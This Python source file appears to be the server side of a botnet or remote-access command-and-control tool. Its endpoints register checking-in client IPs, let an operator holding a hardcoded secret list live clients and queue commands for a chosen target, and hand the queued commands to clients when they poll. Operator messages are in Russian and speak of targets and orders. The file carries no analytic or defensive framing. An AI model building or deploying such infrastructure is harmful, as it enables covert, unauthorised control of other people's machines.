import datetime
import os
import socket
import json

from common import Server


def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.255.255.255', 1))
        ip_address = s.getsockname()[0]
    finally:
        s.close()
    return ip_address

local_ip = get_local_ip()

HOST = local_ip#os.environ.get('HOST', 'localhost')
PORT = int(os.environ.get('PORT', 8080))

SECRET = "DanceBanana"

server = Server(HOST, PORT)

current_active = {}
commands = {}

@server.endpoint
def hwy(data, addr, conn):
    current_active[addr[0]] = str(datetime.datetime.now())
    active_commands = []
    if addr[0] in commands:
        active_commands = commands[addr[0]]
    else:
        commands[addr[0]] = []

    return {"ANSWER": len(active_commands)}

@server.endpoint
def whoAlive(data, *args):
    if data["SECRET"] == SECRET:
        return current_active

@server.endpoint
def sendCommand(data, *args):
    if data["SECRET"] == SECRET:
        if data["TARGET"] not in commands:
            return f'Цель не найдена {data["TARGET"]}'
        commands[data["TARGET"]].append({
            "COMMAND_TYPE": data["COMMAND_TYPE"],
            "CONTENT": data["CONTENT"]
        })
        return f"Жду {data['TARGET']} для выдачи приказа"

@server.endpoint
def getCommand(data, addr, *args):
    active_commands = []
    if addr[0] in commands:
        active_commands = commands[addr[0]]
    else:
        commands[addr[0]] = []

    if active_commands:
        command = active_commands.pop(0)
        return command
    else:
        return {"COMMAND_TYPE": "PASS", "CONTENT": ""}

@server.endpoint
def isItYou(data, addr, *args):
    return "YES"

if __name__ == '__main__':
    # main()
    server.start()